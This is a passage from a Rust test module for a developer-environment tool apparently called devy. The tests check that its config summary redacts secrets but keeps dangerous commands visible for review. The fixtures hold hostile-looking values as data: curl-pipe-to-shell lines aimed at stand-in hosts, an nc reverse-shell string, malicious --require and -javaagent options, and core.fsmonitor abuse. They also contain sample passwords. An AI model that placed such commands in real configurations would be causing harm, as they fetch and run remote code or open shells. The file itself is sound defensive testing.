            "  SSH_AUTH_SOCK: /tmp/agent.sock\n",
            "  GOOGLE_APPLICATION_CREDENTIALS: creds.json\n",
            "  DBUS_SESSION_BUS_ADDRESS: \"unix:path=/tmp/bus\"\n",
            "  NODE_TLS_REJECT_UNAUTHORIZED: \"0\"\n",
            "  RESTIC_PASSWORD_COMMAND: \"sh -c 'curl x | sh'\"\n",
            "  ANSIBLE_VAULT_PASSWORD_FILE: ./scripts/vault.sh\n",
            "  BORG_PASSCOMMAND: \"curl evil.example | sh\"\n",
            "  SOPS_AGE_KEY_CMD: \"sh ./x\"\n",
            "  GIT_CREDENTIAL_HELPER: osxkeychain\n",
            "  VAULT_PASSWORD_COMMAND: \"npx evil-pkg | tee x\"\n",
            "  GIT_CONFIG_KEY_0: core.fsmonitor\n",
            "  SSL_CERT_DIR: \"https://u:s3cr3tpw@host/certs\"\n",
        ));
        let lines = render_summary(&summary(&cfg, &dir)).join("\n");
        for shown in [
            "  GIT_ASKPASS=./scripts/x.sh",
            "  SSH_ASKPASS=askpass-helper",
            "  SUDO_ASKPASS=sh -c 'curl x | sh'",
            "  SSL_CERT_FILE=/tmp/evil.pem",
            "  NODE_EXTRA_CA_CERTS=certs/ca.pem",
            "  SSH_AUTH_SOCK=/tmp/agent.sock",
            "  GOOGLE_APPLICATION_CREDENTIALS=creds.json",
            "  DBUS_SESSION_BUS_ADDRESS=unix:path=/tmp/bus",
            "  NODE_TLS_REJECT_UNAUTHORIZED=0",
            "  RESTIC_PASSWORD_COMMAND=sh -c 'curl x | sh'",
            "  ANSIBLE_VAULT_PASSWORD_FILE=./scripts/vault.sh",
            "  BORG_PASSCOMMAND=curl evil.example | sh",
            "  SOPS_AGE_KEY_CMD=sh ./x",
            "  GIT_CREDENTIAL_HELPER=osxkeychain",
            "  VAULT_PASSWORD_COMMAND=npx evil-pkg | tee x",
            "  GIT_CONFIG_KEY_0=core.fsmonitor",
            "  SSL_CERT_DIR=<redacted>",
        ] {
            assert!(lines.contains(shown), "want {shown:?} in\n{lines}");
        }
        assert!(!lines.contains("s3cr3tpw"), "{lines}");
    }

    /// Every hidden value says it needs review unless the key ends in a word that names
    /// the secret itself; provider keys are command keys and `OPTS` reads like `OPTIONS`.
    #[test]
    fn hidden_values_say_they_need_review_unless_the_key_names_the_secret() {
        let dir = crate::test_support::tmp_dir();
        let cfg = config(concat!(
            "environment:\n",
            "  CARGO_REGISTRY_CREDENTIAL_PROVIDER: \"cargo:token-from-stdout x\"\n",
            "  CARGO_REGISTRIES_MY_REG_CREDENTIAL_PROVIDER: cargo:token\n",
            "  CARGO_REGISTRY_GLOBAL_CREDENTIAL_PROVIDERS: \"cargo:token cargo:libsecret\"\n",
            "  CARGO_REGISTRIES_X_CREDENTIAL_PROVIDER: \"sh -c 'curl x | sh'\"\n",
            "  PASSWORD_STORE_GPG_OPTS: hunter2 batch\n",
            "  PASSWORD_STORE_X_OPTS: --no-throw-keyids\n",
            "  SSH_ASKPASS_REQUIRE: force\n",
            "  MY_PASSWORD_MODE: hunter2\n",
            "  API_TOKEN: abc123\n",
            "  DB_PASSWORD: force\n",
            "  APP_SECRETS: abc\n",
            "  MYSQL_PWD: hunter2\n",
        ));
        let lines = render_summary(&summary(&cfg, &dir)).join("\n");
        for want in [
            "  CARGO_REGISTRY_CREDENTIAL_PROVIDER=<redacted> (a command; review it in devy.yml)",
            "  CARGO_REGISTRIES_MY_REG_CREDENTIAL_PROVIDER=<redacted> (a command; review it in devy.yml)",
            "  CARGO_REGISTRY_GLOBAL_CREDENTIAL_PROVIDERS=<redacted> (a command; review it in devy.yml)",
            "  CARGO_REGISTRIES_X_CREDENTIAL_PROVIDER=sh -c 'curl x | sh'",
            "  PASSWORD_STORE_GPG_OPTS=<redacted> (may name a program or file; review it in devy.yml)",
            "  PASSWORD_STORE_X_OPTS=--no-throw-keyids",
            "  SSH_ASKPASS_REQUIRE=force",
            "  MY_PASSWORD_MODE=<redacted> (may name a program or file; review it in devy.yml)",
            "  API_TOKEN=<redacted>\n",
            "  DB_PASSWORD=<redacted>\n",
            "  APP_SECRETS=<redacted>\n",
            // `PWD` is also the shell's working directory: masked, with the note.
            "  MYSQL_PWD=<redacted> (may name a program or file; review it in devy.yml)",
        ] {
            assert!(lines.contains(want), "want {want:?} in\n{lines}");
        }
        assert!(!lines.contains("hunter2"), "{lines}");
    }

    /// Relative paths under program and file keys are shown; anything such a key hides
    /// says it may name a program or file.
    #[test]
    fn relative_program_and_file_paths_are_shown_and_hidden_ones_are_flagged() {
        let dir = crate::test_support::tmp_dir();
        let cfg = config(concat!(
            "environment:\n",
            "  GIT_ASKPASS: scripts/askpass.sh\n",
            "  SSH_ASKPASS: bin/x\n",
            "  SUDO_ASKPASS: hunter2x9\n",
            "  ANSIBLE_VAULT_PASSWORD_FILE: scripts/vault.sh\n",
            "  NODE_EXTRA_CA_CERTS: certs/evil\n",
            "  DB_PASSWORD_FILE: vault.sh\n",
            "  API_KEY: sk_live_abcdefghijklmnop1234\n",
            "  CREDENTIALS_PATH: hunter8\n",
            "  SONATYPE_CREDENTIALS: deployer/Xy7pq\n",
        ));
        let lines = render_summary(&summary(&cfg, &dir)).join("\n");
        for shown in [
            "  GIT_ASKPASS=scripts/askpass.sh\n",
            "  SSH_ASKPASS=bin/x\n",
            "  SUDO_ASKPASS=hunter2x9\n",
            "  ANSIBLE_VAULT_PASSWORD_FILE=scripts/vault.sh\n",
            "  NODE_EXTRA_CA_CERTS=certs/evil\n",
            "  DB_PASSWORD_FILE=vault.sh\n",
            "  API_KEY=<redacted>\n",
            "  CREDENTIALS_PATH=<redacted> (may name a program or file; review it in devy.yml)\n",
            "  SONATYPE_CREDENTIALS=<redacted> (may name a program or file; review it in devy.yml)",
        ] {
            assert!(
                format!("{lines}\n").contains(shown),
                "want {shown:?} in\n{lines}"
            );
        }
        assert!(!lines.contains("sk_live"), "{lines}");
        assert!(!lines.contains("hunter8"), "{lines}");
        assert!(!lines.contains("Xy7pq"), "{lines}");
    }

    /// A secret-looking assignment at the start of an execution-affecting value hides
    /// only its own token, and the summary says the value is partly hidden.
    #[test]
    fn leading_assignment_never_hides_the_rest_of_a_value() {
        let dir = crate::test_support::tmp_dir();
        let cfg = config(concat!(
            "environment:\n",
            "  GIT_SSH_COMMAND: \"TOKEN=1 sh -c 'curl evil|sh'\"\n",
            "  GIT_CONFIG_PARAMETERS: \"'credential.password=x' 'core.fsmonitor=sh -c evil'\"\n",
            "  NODE_OPTIONS: \"--tls-keylog=/tmp/k --require ./evil.js\"\n",
            "  JAVA_TOOL_OPTIONS: \"-Djavax.net.ssl.keyStorePassword=changeit -javaagent:/tmp/evil.jar\"\n",
            "  BASH_ENV: \"SESSION=1 ./evil.sh\"\n",
            "  NL_COMMAND: \"true\\nTOKEN=1 sh -c nlevil\"\n",
            "  PATH: \"token=x:/evil/bin:$PATH\"\n",
            "  RESTIC_PASSWORD_COMMAND: \"nc -e /bin/shx evil 4444\"\n",
            "  SOPS_AGE_KEY_CMD: \"npx evilpkg\"\n",
        ));
        let lines = render_summary(&summary(&cfg, &dir)).join("\n");
        for visible in [
            "sh -c 'curl evil|sh'",
            "core.fsmonitor=sh -c evil",
            "--require ./evil.js",
            "-javaagent:/tmp/evil.jar",
            "./evil.sh",
            "sh -c nlevil",
        ] {
            assert!(lines.contains(visible), "{visible:?} hidden:\n{lines}");
        }
        assert!(!lines.contains("changeit"), "{lines}");
        assert!(
            lines.contains("(partly hidden; review it in devy.yml)"),
            "{lines}"
        );
        assert!(
            lines.contains("SOPS_AGE_KEY_CMD=<redacted> (a command; review it in devy.yml)"),
            "{lines}"
        );
        assert!(
            lines.contains("RESTIC_PASSWORD_COMMAND=nc -e /bin/shx evil 4444"),
            "{lines}"
        );
    }

    /// Passwords and keys stay hidden whatever their shape.
    #[test]
    fn summary_never_shows_secret_values_because_of_their_shape() {
        let dir = crate::test_support::tmp_dir();
        let cfg = config(concat!(
            "environment:\n",
            "  API_TOKEN: ghp_abcdefghijklmnopqrstuvwxyz0123456789\n",
            "  SERVICE_TOKEN: Zx9kQ2mT7vB4nR8wL1pS6yH3\n",
            "  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n",
            "  DB_PASSWORD: \"correct horse battery staple\"\n",
            "  MYSQL_ROOT_PASSWORD: \"hunter2&x;y\"\n",
            "  ADMIN_PASSWORD: \"/Pa/ss.123\"\n",
            "  CERT_PASSWORD: hunter3\n",
            "  SECRET_KEY: \"django-insecure-k3y&(x)=+q\"\n",
            "  REDIS_CACHE_KEY: 9f8e7d6c5b\n",
            "  SSL_CERT_KEY: TUlJRXZRSUJBREFOQmdrcWhraUc5dzBCQVFFRkFBU0NCS2N3Z2dTakFnRUFBb0lCQVFD\n",
            "  APNS_CERT_KEY: abc123\n",
            "  GCP_CREDENTIALS: '{\"type\": \"service_account\", \"key_id\": \"zz9yy8\"}'\n",
            "  MY_AUTH_HOOK: \"sh -c 'echo q7q7'\"\n",
            "  SSL_CERT_PASSPHRASE: \"Tr0ub4dor.3\"\n",
            "  CA_PASSCODE: \"pass/word9\"\n",
            "  CERT_PIN: \"8812.pem\"\n",
            "  REGISTRY_CREDENTIALS: \"deploy:s3cr.et1\"\n",
            "  NPM_CREDENTIALS: \"me:S3cr3t/pw\"\n",
            "  SONATYPE_CREDENTIALS: \"deployer/Xy7pq\"\n",
            "  CREDENTIALS_PATH: hunter8\n",
            "  KEYCHAIN_PATH: hunterpw\n",
            "  MASTERKEY_PATH: correcthorsebatterystaple\n",
            "  SSHKEY_OPTIONS: \"correctx horsex 99\"\n",
            "  OAUTH_HELPER: \"s3cr3tz valuez\"\n",
            "  DB_PASSWORD_HELPER: \"correcty horsey\"\n",
            "  JAVA_TOOL_OPTIONS: \"-Dpw=hunterq y\"\n",
            "  CREDENTIAL_HELPER: \"correctw horsew\"\n",
            "  KEYSTORE_OPTIONS: \"Tr0ub4dorw 3x\"\n",
            "  KEYRING_CMD: \"zz99w yy88\"\n",
            "  CERT_COMMAND: \"batteryw staple\"\n",
            "  DB_PW_HELPER: \"hunterr x\"\n",
            "  DB_PW_PATH: \"corrects horses\"\n",
            "  DB_PASSWORD_COMMAND: \"echo hunters\"\n",
            "  GIT_TOKEN_HELPER: \"zz11yy22\"\n",
            "  NODE_EXTRA_CA_CERTS: '{\"k\":\"v/x.pem\"}'\n",
        ));
        let lines = render_summary(&summary(&cfg, &dir)).join("\n");
        for secret in [
            "ghp_abc",
            "Zx9kQ2",
            "wJalrX",
            "correct horse",
            "hunter",
            "Pa/ss",
            "django-insecure",
            "9f8e7d",
            "TUlJRX",
            "abc123",
            "zz9yy8",
            "q7q7",
            "Tr0ub4dor",
            "pass/word9",
            "8812",
            "s3cr.et1",
            "S3cr3t",
            "Xy7pq",
            "hunter8",
            "zz11yy22",
            "v/x.pem",
            "hunterpw",
            "correcthorse",
            "correctx",
            "s3cr3tz",
            "correcty",
            "hunterq",
            "correctw",
            "Tr0ub4dorw",
            "zz99w",
            "batteryw",
            "hunterr",
            "corrects",
            "hunters",
        ] {
            assert!(!lines.contains(secret), "{secret} leaked:\n{lines}");
        }
        assert!(lines.contains("  DB_PASSWORD=<redacted>"), "{lines}");
        assert!(lines.contains("  GCP_CREDENTIALS=<redacted>"), "{lines}");
    }

    #[test]
    fn summary_strips_control_characters() {
        let dir = crate::test_support::tmp_dir();
        let cfg = config("hooks:\n  before_up: \"echo \\e]52;c;eA==\\a hi\\nmore\"\n");
        let lines = render_summary(&summary(&cfg, &dir));
        assert_eq!(lines.len(), 2);
        assert!(!lines[1].chars().any(|c| c.is_control()), "{:?}", lines[1]);
    }

    #[test]
    fn padded_values_are_collapsed_and_long_values_shown_in_full() {
        let dir = crate::test_support::tmp_dir();
        let padded = format!("x{}y", " ".repeat(5000));
        let long = format!("{}; curl evil | sh", "z".repeat(1000));
        let cfg = config(&format!(
            "hooks:\n  before_up: [\"{padded}\", \"{long}\"]\n"
        ));
        let lines = render_summary(&summary(&cfg, &dir));
        assert_eq!(lines[1], "  before_up: x y");
        assert!(lines[2].ends_with("; curl evil | sh"), "{}", lines[2]);
    }

    #[test]
    fn hook_lists_and_configured_commands_are_listed_individually() {
        let cfg = config(
            "hooks:\n  before_up:\n    - \"echo one\"\n    - { cmd: \"echo two\", shell: bash, cwd: web }\n",
        );
        let entries = executable_entries(&cfg, None, false);
        assert_eq!(
            entries.iter().map(|e| e.key.as_str()).collect::<Vec<_>>(),
            ["hooks.before_up[0]", "hooks.before_up[1]"]
        );
        assert_eq!(
            entries[1].value,
            "before_up: echo two (shell: bash, cwd: web)"
        );
    }

    #[test]
    fn diff_reports_added_and_changed_entries_only() {
        let old = config(concat!(
            "dependencies:\n  - jq:\n      after_install: \"echo a\"\n",
            "hooks:\n  before_up: \"make\"\n",
            "commands:\n  dev: \"npm run dev\"\n  gone: x\n",
        ));
        let new = config(concat!(
            "# reformatted\n",
            "hooks: { before_up: 'make', after_up: \"curl x | sh\" }\n",
            "dependencies:\n  - jq:\n      after_install: \"echo b\"\n",
            "commands:\n  dev: 'npm run dev'\n  build: \"make build\"\n",
            "environment:\n  NODE_OPTIONS: \"--require ./x.js\"\n  PLAIN: y\n",
        ));
        let changes = diff(&old, &new, None);
        let summary: Vec<(ChangeKind, &str)> = changes
            .iter()
            .map(|c| (c.kind, c.entry.key.as_str()))
            .collect();
        assert_eq!(
            summary,
            [
                (ChangeKind::Added, "hooks.after_up[0]"),
                (ChangeKind::Changed, "dependencies.jq.after_install"),
                (ChangeKind::Added, "environment.NODE_OPTIONS"),
                (ChangeKind::Added, "environment.PLAIN"),
                (ChangeKind::Added, "commands.build"),
            ]
        );
        assert_eq!(
            changes[1].old_value.as_deref(),
            Some("jq after_install: echo a")
        );
    }

    #[test]
    fn diff_of_identical_configs_is_empty() {
        let yaml = "dependencies:\n  - redis:\n      image: \"redis\"\nhooks:\n  after_up: x\n";
        assert!(diff(&config(yaml), &config(yaml), None).is_empty());
    }

    #[test]
    fn diff_reports_implicit_setup_of_an_added_dependency() {
        let dir = crate::test_support::tmp_dir();
        std::fs::write(dir.join("mix.exs"), "").unwrap();
        let changes = diff(
            &config("dependencies: []\n"),
            &config("dependencies:\n  - elixir\n"),
            Some(&dir),
        );
        assert_eq!(changes.len(), 2);
        assert_eq!(changes[0].entry.group, Group::ProjectSetup);
        assert_eq!(changes[0].entry.value, "elixir: mix deps.get (mix.exs)");
        assert_eq!(changes[1].entry.group, Group::SystemPackages);
    }
}
